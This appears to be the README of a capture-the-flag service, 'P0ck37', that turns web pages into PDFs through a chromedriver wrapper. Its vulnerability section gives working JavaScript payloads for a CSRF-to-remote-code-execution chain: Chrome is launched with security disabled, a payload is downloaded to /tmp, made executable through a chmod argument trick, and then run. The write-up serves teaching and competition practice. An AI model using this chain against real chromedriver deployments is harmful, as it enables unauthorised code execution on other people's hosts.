# P0ck37

## Description


P0ck37 is a service that allows downloading web pages to pdf files, very similar to [Pocket](https://getpocket.com/).
The service consists of two components: the web application and chromedriver service. The web application uses chromedriver service to convert web pages to pdfs using a Google Chrome web browser.

## Architecture

The only known option to configure chromedriver to handle remote requests from the application is by using `--whitelisted-ips=` option. But this option is known to be vulnerable to the CSRF attack via DNS rebinding.

To not use this option there was written a small wrapper on Go that proxies all requests to local chromedriver.


## Flags

Flags are pdf files stored in the directory `/data`.

## Vulns

The wrapper for the chromedriver is vulnerable to the CSRF attack too. And it allows achieving a remote command execution via the running chromedriver.

The attack consists of the three steps:

0. Through the main functionality of the service ask chromedriver to open an attacker's webpage in chrome.
1. Configure chrome to download files to a specific folder (`/tmp`).
2. Download a payload file to the location known to the attacker.
3. Make this payload file executable.
4. Execute it.

The initial step could be done by exploiting a CSRF attack. This could be done by the following POST request:
```
var caps = {
  "browserName": "chrome",
  "goog:chromeOptions": {
    "args":["--disable-web-security", "--no-sandbox", "--app=<URL of the next stage>"],
    "prefs": {
      "download.default_directory": "/tmp",
      "safebrowsing.enabled": "false"
    }
  }
};

var opts = {
  "desiredCapabilities": caps,
  "capabilities": {
    "firstMatch": [caps]
  }
};

var req = new XMLHttpRequest();
req.open('POST', 'http://127.0.0.1:4444/wd/hub/session');
req.setRequestHeader('Content-Type', 'text/plain');
req.send(JSON.stringify(opts));
</script>
```

After execution of this script chromedriver will run a new Google Chrome instance with disabled security settings (`--disable-web-security`). The location for downloading files will be `/tmp` (it is controlled by the `download.default_directory` setting). And this new browser instance will open another URL controlled by the attacker (`--app=<URL>` chromedriver option).

The next step is to download payload to the filesystem. This could be done by the following javascript:
```
link.href = '<URL of the payload>';
document.body.appendChild(link);

// This click will trigger an automatic file download to the /tmp directory
link.click();
document.body.removeChild(link);
delete link;
```

To make this payload file executable the attacker could ask chromedriver to execute `chmod` via the following POST request:
```
<script>
var req = new XMLHttpRequest();
req.open('POST', 'http://127.0.0.1:4444/wd/hub/session');
req.setRequestHeader('Content-Type', 'text/plain');

var opts = {
  "binary":"/bin/chmod",
  "args":["-w+x", "=", "--unknown"],
  "prefs": {"useAutomationExtension": false},
  "excludeSwitches":["disable-client-side-phishing-detection","enable-logging","log-level","password-store","allow-pre-commit-input","disable-background-networking","disable-default-apps","disable-hang-monitor","disable-popup-blocking","disable-prompt-on-repost","disable-sync","enable-automation","enable-blink-features","no-first-run","no-service-autorun","test-type","use-mock-keychain"]
};

var caps = {
  "desiredCapabilities":{
    "browserName":"chrome",
    "goog:chromeOptions": opts
  },
  "capabilities":{
    "firstMatch":[
      {
        "browserName":"chrome",
        "goog:chromeOptions": opts
      }
    ]
  }
};

req.send(JSON.stringify(caps));
</script>
```

The main trick here is the name of the payload: it should start with `--`. It will ask a `chmod` to ignore all other chromedriver options and successfully make the payload file executable.

And the last step is to execute the payload file. This could be done by the following POST request:
```
<script>
var req = new XMLHttpRequest();
req.open('POST', 'http://127.0.0.1:4444/wd/hub/session');
req.setRequestHeader('Content-Type', 'text/plain');

var opts = {
  "binary":"/tmp/--unknown"
};

var caps = {
  "desiredCapabilities":{
    "browserName":"chrome",
    "goog:chromeOptions": opts
  },
  "capabilities":{
    "firstMatch":[
      {
        "browserName":"chrome",
        "goog:chromeOptions": opts
      }
    ]
  }
};

req.send(JSON.stringify(caps));
</script>
```
